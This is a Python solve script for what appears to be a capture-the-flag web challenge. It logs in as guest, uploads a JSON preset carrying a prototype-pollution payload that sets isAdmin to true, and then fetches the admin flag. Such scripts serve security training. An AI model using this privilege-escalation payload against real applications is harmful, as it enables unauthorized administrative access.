import sys
import requests
import json

URL = sys.argv[1] if len(sys.argv) > 1 else "http://ctf.ac.upt.ro:9904"
session = requests.Session()

def login(username="guest", password="guest"):
    resp = session.post(f"{URL}/login", data={"username": username, "password": password})
    if resp.status_code in (200, 302):
        print("logged in")
        return True
    print("login failed:", resp.status_code)
    return False

def upload(payload_bytes, filename="exploit.json", content_type="application/json"):
    files = {
        "preset": (filename, payload_bytes, content_type)
    }
    resp = session.post(f"{URL}/api/preset/upload", files=files)
    print("upload status:", resp.status_code)
    try:
        print(resp.text)
    except:
        pass
    return resp

def get_flag():
    resp = session.get(f"{URL}/admin/flag")
    if resp.status_code == 200 and "ctf{" in resp.text:
        print("flag:", resp.text.strip())
        return resp.text.strip()
    print("no flag, status:", resp.status_code)
    print(resp.text)
    return None

def main():
    if not login():
        return
    payload = {
        "a": { "b": { "c": {
            "constructor": { "prototype": { "isAdmin": True } }
        } } }
    }
    p_bytes = json.dumps(payload).encode()
    print("send")
    r = upload(p_bytes)
    flag = get_flag()
    if flag:
        return

if __name__ == "__main__":
    main()
